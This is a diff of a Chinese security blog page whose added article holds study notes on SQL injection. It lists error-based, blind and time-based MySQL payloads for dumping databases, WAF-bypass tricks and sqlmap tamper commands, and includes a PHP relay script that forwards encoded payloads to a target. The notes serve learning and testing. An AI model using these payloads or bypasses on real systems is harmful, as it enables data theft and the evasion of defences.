@@ -6,7 +6,7 @@
     <meta name="referrer" content="origin">
     <meta http-equiv="Cache-Control" content="no-transform">
     <meta http-equiv="Cache-Control" content="no-siteapp">
-    <title>点击劫持</title>
+    <title>SQL注入基础</title>
 
     <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/font/LongCang.css">
     <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/font/Monda.css">
@@ -31,19 +31,19 @@
     <div class="header">
         <div class="vertical">
             <div class="inner">
-                <h1 class="header-subtitle">点击劫持</h1>
+                <h1 class="header-subtitle">SQL注入基础</h1>
                 <div class="header-subinfo">
                     <p class="article-info-text">
                         <span>
-                            <i class="iconfont icon-time"></i> 发表时间：2021-05-04
+                            <i class="iconfont icon-time"></i> 发表时间：2021-04-23
                         </span>
                         
-                            <span id="/2021/05/04/点击劫持/" class="leancloud_visitors" data-flag-title="点击劫持">
+                            <span id="/2021/04/23/sql注入基础知识/" class="leancloud_visitors" data-flag-title="SQL注入基础">
                                 <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
                             </span>
                         
                         <span>
-                            <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2021/05/04/点击劫持/"></span>
+                            <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2021/04/23/sql注入基础知识/"></span>
                         </span>  
                     </p>                 
                 </div>
@@ -57,9 +57,98 @@
         <div id="article">
     <div class="toc"></div>
     <div class="article-body">
-        <p>点击劫持就是一种视觉上的欺骗手段。攻击者使用一个透明的、不可见的iframe，覆盖在一个网页上。</p>
-<p>点击劫持攻击与CSRF攻击有异曲同工之妙，都是在用户不知情的情况下诱使用户完成一些动作。但是在CSRF攻击的过程中，如果出现用户交互的页面，则攻击可能会无法顺利完成。与之相反的是，点击劫持没有这个顾虑，它利用的就是与用户产生交互的页面。</p>
-<h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><h2 id="flash点击劫持"><a href="#flash点击劫持" class="headerlink" title="flash点击劫持"></a>flash点击劫持</h2><h2 id="图片覆盖攻击"><a href="#图片覆盖攻击" class="headerlink" title="图片覆盖攻击"></a>图片覆盖攻击</h2><h2 id="拖拽劫持与数据窃取"><a href="#拖拽劫持与数据窃取" class="headerlink" title="拖拽劫持与数据窃取"></a>拖拽劫持与数据窃取</h2><h2 id="clickjacking-3-0-触碰劫持"><a href="#clickjacking-3-0-触碰劫持" class="headerlink" title="clickjacking 3.0:触碰劫持"></a>clickjacking 3.0:触碰劫持</h2><h1 id="防御clickjacking"><a href="#防御clickjacking" class="headerlink" title="防御clickjacking"></a>防御clickjacking</h1><p>更新中。。。。</p>
+        <p>SQL注入是一种常见的WEB安全漏洞，攻击者利用这个漏洞，可以访问或修改数据，或者利用潜在的数据库漏洞进行攻击。</p>
+<h1 id="数据库注入"><a href="#数据库注入" class="headerlink" title="数据库注入"></a>数据库注入</h1><ol>
+<li>明确注入数据库类型，权限</li>
+<li>明确提交方法，参数类型等</li>
+<li>明确数据库记录信息系统表</li>
+<li>依次库、表、列、值注入查询</li>
+<li>找后台，登录，获取shell（可能失败）</li>
+<li>有高权限的话尝试，文件读写/命令执行/注册表读取等</li>
+</ol>
+<h1 id="sql注入介绍"><a href="#sql注入介绍" class="headerlink" title="sql注入介绍"></a>sql注入介绍</h1><ol>
+<li>sql注入在安全问题中排行榜首</li>
+<li>sql注入攻击是输入参数未经过过滤，然后直接拼接到SQL语句当中解析</li>
+<li>sql注入是一种将sql代码添加到输入参数中，传递到服务器解析并执行的一种攻击手法</li>
+</ol>
+<h1 id="sql注入原理"><a href="#sql注入原理" class="headerlink" title="sql注入原理"></a>sql注入原理</h1><ol>
+<li>提交恶意代码</li>
+<li>后台未过滤或过滤不足</li>
+<li>获取数据库的敏感信息</li>
+</ol>
+<h1 id="sql注入实现方式"><a href="#sql注入实现方式" class="headerlink" title="sql注入实现方式"></a>sql注入实现方式</h1><ol>
+<li>手动注入</li>
+<li>自动注入（工具）</li>
+</ol>
+<h1 id="数据库的基本操作"><a href="#数据库的基本操作" class="headerlink" title="数据库的基本操作"></a>数据库的基本操作</h1><p>语句：</p>
+<ol>
+<li>查看所有的数据库：show databases;</li>
+<li>使用库:use dvwa;</li>
+<li>查看默认库：select database();当前连接的数据库</li>
+<li>查看所有表：show tables;</li>
+<li>查看表结构: desc表；</li>
+<li>查看创建sql语句：show create table users\G; (G:表示字段以行方式显示)</li>
+<li>查看当前默认用户：select user();</li>
+<li>查看版本： select cersion();</li>
+</ol>
+<h1 id="查询语句"><a href="#查询语句" class="headerlink" title="查询语句"></a>查询语句</h1><ol>
+<li>查询所有字段：select * from users;</li>
+<li>查询指定字段：select user,password from users;</li>
+<li>条件查询：select * from users where user = ‘admin’</li>
+<li>逻辑与： select * from users where user = ‘admin’ and user_id=6</li>
+<li>逻辑或： select * from users where user = ‘admin’ or user_id=6</li>
+</ol>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>针对SQL注入的攻击行为可描述为通过用户可控参数中注入SQL语句，破坏原有的SQL结构，达到编写程序时意料之外结果的攻击行为。其成因可以归结为以两个原因叠加造成的：<br>1、程序编写者在处理程序和数据库交互时，使用字符串拼接的方式构造SQL语句。<br>2、未对用户可控参数进行足够的过滤便将参数内容拼接进入到SQL语句中。</p>
+<h2 id="注入点可能存在的位置"><a href="#注入点可能存在的位置" class="headerlink" title="注入点可能存在的位置"></a>注入点可能存在的位置</h2><p>根据SQL注入漏洞的原理，在用户“可控参数”中注入SQL语法，也就是说WEB应用在获取用户数据的地方，只要带入数据库查询，都会存在SQL注入的可能，这些地方通常包含:<br>@GET 数据<br>@POST 数据<br>@HTTP 头部 （HTTP 请求报文其他字段）<br>@Cookie 数据<br>。。。</p>
+<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>攻击者利用SQL注入漏洞，可以获取数据库中的多种信息（例如：管理员后台密码），从而脱取数据库中的内容（脱库）。在特别情况下还可以修改数据库内容或者插入内容到数据库，如果数据库权限分配存在问题，或者数据库本身存在缺陷，那么攻击者可以通过SQL注入漏洞直接获取webshell或者服务器系统权限。<br>      mof|udf</p>
+<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>SQL注入漏洞根据不同的标准，有不同的分类。但是从数据类型分类来看，SQL注入分为数字型和字符型。<br>数字型注入就是说注入点的数据，拼接到SQL语句中是以数字型出现的，即数据两边没有被单引号、双引号包括。<br>字符型注入正好相反。</p>
+<p>根据注入手法分类，大致可分为以下几类<br>@UNION query SQL injection （可联合查询注入）<br>@error-based SQL injection （报错型注入）<br>@boolean-based blind SQL injection （布尔型注入）<br>@time-based blind SQL injection （基于时间延迟注入）<br>@stacked queries SQL injection （可多语句查询注入）</p>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>报错注入在没法用union联合查询时用，但前提还是不能过滤一些关键的函数。<br>报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这里主要记录一下xpath语法错误和concat+rand()+group_by()导致主键重复</p>
+<h2 id="xpath语法错误"><a href="#xpath语法错误" class="headerlink" title="xpath语法错误"></a>xpath语法错误</h2><p>利用xpath语法错误来进行报错注入主要利用extractvalue和updatexml两个函数。<br>使用条件：mysql版本&gt;5.1.5</p>
+<p><em>@extractalue( )</em><br>id=’and(select extractvalue(“anything”,concat(‘<del>‘,(select语句))))<br>id=’and(select extractvalue(1,concat(‘</del>‘,(select database()))))<br>id=’and(select extractvalue(1,concat(0x7e,@@version)))</p>
+<p>针对mysql数据库：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查数据库名：id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select database()))))</span><br><span class="line">爆表名：id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))))</span><br><span class="line">爆字段名：id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;TABLE_NAME&quot;))))</span><br><span class="line">爆数据：id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))</span><br></pre></td></tr></table></figure>
+<p>① 0x7e=’<del>’<br>② concat(‘a’,‘b’)=“ab”<br>③ version()=@@version<br>④ ‘</del>‘可以换成’#’、’$’等不满足xpath格式的字符<br>⑤ extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位</p>
+<p><em>@ updatexml()</em><br>id=’and(select updatexml(“anything”,concat(‘<del>‘,(select语句())),”anything”))<br>‘and(select updatexml(1,concat(‘</del>‘,(select database())),1))<br>‘and(select updatexml(1,concat(0x7e,@@database),1))</p>
+<p>针对mysql数据库：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">爆数据库名：&#39;and(select updatexml(1,concat(0x7e,(select database())),0x7e))</span><br><span class="line">爆表名：&#39;and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;database())),0x7e))</span><br><span class="line">爆列名：&#39;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;&quot;TABLE_NAME&quot;)),0x7e))</span><br><span class="line">爆数据：&#39;and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))</span><br></pre></td></tr></table></figure>
+
+<h2 id="concat-rand-group-by-导致主键重复"><a href="#concat-rand-group-by-导致主键重复" class="headerlink" title="concat+rand()+group_by()导致主键重复"></a>concat+rand()+group_by()导致主键重复</h2><p>这种报错方法的本质是因为floor(rand(0)*2)的重复性，导致group by语句出错<br>rand()：生成0~1之间的随机数<br>floor()：对任意正或者负的十进制值向下取整<br>通常利用这两个函数的方法是floor(rand(0))*2 ,其会生成0和1两个数</p>
+<p>‘union select 1 from (select count(*),concat((slelect语句),floor(rand(0)*2))x from “一个足大的表” group by x)a–+</p>
+<p>‘union select 1 from (select count(*),concat((select user()),floor(rand(0)*2))x from information_schema.tables group by x)a–+<br>利用information_schema.tables表，相似的还可以用information_schema.columns等</p>
+<p>‘union select 1 from (select count(*),concat((select user()),” “,floor(rand(0)*2))x from information_schema.tables group by x)a</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">爆数据库名：&#39;union select 1 from (select count(*),concat((select database()),&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line">爆表名：&#39;union select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line">爆列名：&#39;union select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name&#x3D;&quot;TABLE_NAME&quot; limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line">爆数据：&#39;union select 1 from (select count(*),concat((select COLUMN_NAME from TABLE_NAME limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br></pre></td></tr></table></figure>
+
+<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><p>很多时候，web服务器关闭了错误回显，这时就没有办法成功实施SQL注入攻击了吗？攻击者为了应对这种情况，研究出了“盲注”的技巧<br>?id=2 and 1=1<br>?id=2 and 1=2<br>分别测试，看两者之间的显示区别</p>
+<h1 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h1><p>if(),sleep()函数<br>select if(database()=’na’,123,456);<br>select * from member where id=1 and sleep(if(database()=’a’,1,0));<br>select * from member where id=1 and sleep(if(length(database())=8,5,0))–+ #判断长度<br>select * from users where id=1 and sleep(if(mid(database(),1,1)=’s’,5,0));</p>
+<p>limit<br>mysql&gt; SELECT * FROM table LIMIT 5,10; // 检索记录行 6-15<br>mysql&gt; SELECT * FROM table LIMIT 5; //检索前 5 个记录行,换句话说，LIMIT n 等价于 LIMIT 0,n。</p>
+<p>benchmark()<br>在MYSQL中，有一个benchmark()函数，它是用于测试函数性能的。它又两个参数benchmark(count,expr)，函数执行结果是将表达式expr执行count次。<br>比如：select benchmark(1000000,encode(‘hello’,’goodbye’)),就将encode(‘hello’,’goodbye’)执行了1000000次<br>利用这个函数，可以让同一个函数执行多次，是结果返回的时间比平时要长；通过时间长短的变化来判断出注入语句是否执行成功。</p>
+<h1 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h1><p>页面只返回True和False两种类型页面。利用页面返回不同，逐个猜解数据</p>
+<h1 id="加解密注入"><a href="#加解密注入" class="headerlink" title="加解密注入"></a>加解密注入</h1><p>在加密值处注入的话，就要payload都加密，一般cookie都是密文</p>
+<h1 id="二次注入（还不太懂）"><a href="#二次注入（还不太懂）" class="headerlink" title="二次注入（还不太懂）"></a>二次注入（还不太懂）</h1><p>一般是白盒的情况下<br>二次注入是SQL注入的一种，是在输入的字符串之中注入SQL指令，在设计不良的程序当中忽略了检查，那么这些注入进去的指令会被数据库服务器误认为是正常的SQL指令而运行，因此遭到破坏。<br>那为什么需要二次注入，因为在字符型注入一般都有单引号的存在，首先构造注入闭合单引号，再通过第二次构造语句，在第一次注入的基础上进行注入。</p>
+<p>主要分为两步：<br>第一步：插入恶意数据<br>第二步：引用恶意数据</p>
+<h1 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h1><p>更新中。。。</p>
+<h1 id="堆叠查询"><a href="#堆叠查询" class="headerlink" title="堆叠查询"></a>堆叠查询</h1><p>堆叠注入从名词的含义就可以看到应该是一堆sql语句（多条一起执行）。而在真实的运用中也是这样的，我们知道在mysql中，主要是命令行<br>中，每一条语句结尾加；表示语句结束。这样我们就想到了是不是可以多句一起使用。，这就叫堆叠注入。</p>
+<h1 id="http参数污染"><a href="#http参数污染" class="headerlink" title="http参数污染"></a>http参数污染</h1><p>下表是服务器对参数的解析<br>| web服务器 | 参数获取函数 | 获取到的参数 |<br>| :——: | :——: | :——: |<br>| PHP/Apache | $_GET(“par”) | Last |<br>| JSP/Tmocat | Request.getParameter(“par”) | First |<br>| Perl(CGI)/Apache | Param(“par”) | First |<br>| Python/Apache | getvalue(“par”) | All(List) |<br>| ASP/IIS | Request.QueryString(“par”) | All(comma-delimited string) |</p>
+<h1 id="WAF绕过-SQL注入"><a href="#WAF绕过-SQL注入" class="headerlink" title="WAF绕过-SQL注入"></a>WAF绕过-SQL注入</h1><h2 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h2><p>1.大小写<br>2.加解密<br>3.编码解码<br>4.等价函数<br>5.特殊符号</p>
+<p><img src="/image/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%801.png"></p>
+<p>6.反序列化<br>7.注释符混用<br>/*!select * from users*/</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">再看下面这句</span><br><span class="line">&#x2F;\*!50001 select \* from users\*&#x2F;</span><br><span class="line">这里的50001表示假如数据库是5.00.01以上版本，该语句才会被执行</span><br><span class="line">因此固然 你的mysqldump出来的成立，view的语句在解释里，实际上它是会被执行的</span><br><span class="line">假如是以下内容，就不会推行，那是真正的解释</span><br><span class="line">&#x2F;\*select \* from users\*&#x2F;</span><br></pre></td></tr></table></figure>
+<p>安全狗匹配的时候匹配的是1/**-1 union select 1,2,3#*/ 或 1/**&amp;id=-1%20union%20select%201,2,3%23*/ 其中符号中起到注释作用，正常<br>情况下没有执行，安全狗直接不管，但是参数污染导致接受的真实数据是-1 union select 1,2,3#*/ 能正常执行sql</p>
+<h2 id="方式"><a href="#方式" class="headerlink" title="方式"></a>方式</h2><p>1.更改提交方式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select @database();</span><br><span class="line">select ~@database();</span><br><span class="line">select database();</span><br><span class="line">select !database();</span><br></pre></td></tr></table></figure>
+<p>2.变异</p>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>1.fuzz大法<br>2.数据库特性<br>3.垃圾数据溢出<br>4.HTTP参数污染<br>等等</p>
+<p>*WAF部署-安全狗，宝塔，D盾，防护神等waf搭建部署</p>
+<h1 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h1><h2 id="IP名单"><a href="#IP名单" class="headerlink" title="IP名单"></a>IP名单</h2><p>从网络中获取的IP，这种一般伪造不来，如果是获取客户端的IP，这样就可能存在伪造IP绕过的情况。<br>测试方法：修改http的header来bypass waf<br>X-forwarded-forwarded-f<br>X-remote-IP<br>X-originating-IP<br>X-remote-addr<br>X-Real-ip</p>
+<h2 id="爬虫白名单"><a href="#爬虫白名单" class="headerlink" title="爬虫白名单"></a>爬虫白名单</h2><p>部分waf有提供爬虫白名单的功能，识别爬虫的技术一般有两种；<br>1、根据useragent  2、通过行为来判断<br>useragent可以很容易欺骗，我们可以伪装成爬虫尝试绕过。<br>user agent switcher (firefox 附加组件)</p>
+<p><em>搜索引擎爬虫 http 指纹头</em><br><em>中转脚本</em><br><em>Sqlmap扫描被拦截时，挂代理池或延时</em></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">例子</span><br><span class="line">sqlmap -u &quot;url&quot; --tamper&#x3D;bypassdog --random-agent</span><br><span class="line">sqlmap -u &quot;url&quot; --tamper&#x3D;rdog.py --proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:8888 --random-agent</span><br><span class="line">sqlmap -u &quot;url&quot; --tamper&#x3D;rdog.py --proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:8888 --random-agent -tables</span><br><span class="line">sqlmap -u &quot;url&quot; --tamper&#x3D;rdog.py --proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:8888 --random-agent&#x3D;&quot;Mozila&#x2F;5.0 (compatible; Baiduspider&#x2F;2.0;+http:&#x2F;&#x2F;www.baidu.com&#x2F;search&#x2F;spider.html)&quot;</span><br><span class="line">sqlmap -u &quot;url&quot; -r 3.txt --tamper&#x3D;rdog.py --proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:8888 -tables</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url&#x3D;&#39;http:&#x2F;&#x2F;xxxx&#x2F;job_byatjb&#x2F;yja_byszja.asp?id&#x3D;&#39;;</span><br><span class="line">$payload&#x3D;base64_encode($_GET[&#39;x&#39;]);</span><br><span class="line">echo $payload;</span><br><span class="line">$urls&#x3D;$url.$payload;</span><br><span class="line">file_get_contents($urls);</span><br><span class="line">echo $urls;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><em>sqlmap去注入本地的脚本地址-&gt; 本地搭建脚本（请求数据包自定义编写）-&gt; 远程地址</em></p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="http://www.cnblogs.com/keta/p/9469417.html">www.cnblogs.com/keta/p/9469417.html</a></p>
 
         <p class="suffix-end">__END__</p>
         <div class="suffix-box">
@@ -69,7 +158,7 @@
             <div class="suffix-box-right">
                 <span class="suffix-box-title">文章作者</span>：moss
                 <br>
-                <span class="suffix-box-title">文章出处</span>：<a href="/2021/05/04/%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81/" target="_blank">点击劫持</a>
+                <span class="suffix-box-title">文章出处</span>：<a href="/2021/04/23/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" target="_blank">SQL注入基础</a>
                 <br>
                 <span class="suffix-box-title">作者签名</span>：等花开，等风来
                 <br>
@@ -86,7 +175,7 @@
             <div class="category">
                 分类：
                 
-                    <a href="/category/web%E5%AE%89%E5%85%A8-%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81/">-web安全 -点击劫持</a>
+                    <a href="/category/web%E5%AE%89%E5%85%A8-sql%E6%B3%A8%E5%85%A5/">-web安全 -sql注入</a>
                 
             </div>
         
@@ -100,11 +189,11 @@
         
         <div class="article-prev-next">
             
-                <a href="/2021/05/05/DNS%E8%A7%A3%E6%9E%90%E5%92%8C%E6%9F%A5%E8%AF%A2/" class="prev-prefix">« </a> 上一篇：    <a href="/2021/05/05/DNS%E8%A7%A3%E6%9E%90%E5%92%8C%E6%9F%A5%E8%AF%A2/" title="发布于 2021-05-05 10:44">DNS解析和查询</a>
+                <a href="/2021/04/23/ctfshow-web%E5%85%A5%E9%97%A8/" class="prev-prefix">« </a> 上一篇：    <a href="/2021/04/23/ctfshow-web%E5%85%A5%E9%97%A8/" title="发布于 2021-04-23 04:38">ctfshow-web入门</a>
                 <br>
             
             
-                <a href="/2021/04/29/%E7%A0%B4%E8%A7%A3mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%BC%B1%E5%8F%A3%E4%BB%A4/" class="next-prefix">» </a> 下一篇：    <a href="/2021/04/29/%E7%A0%B4%E8%A7%A3mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%BC%B1%E5%8F%A3%E4%BB%A4/" title="发布于 2021-04-29 10:49">破解mysql数据库弱口令</a>
+                <a href="/2021/04/22/markdown%E8%AF%AD%E6%B3%95/" class="next-prefix">» </a> 下一篇：    <a href="/2021/04/22/markdown%E8%AF%AD%E6%B3%95/" title="发布于 2021-04-22 09:05">markdown语法</a>
             
         </div>
     </div>
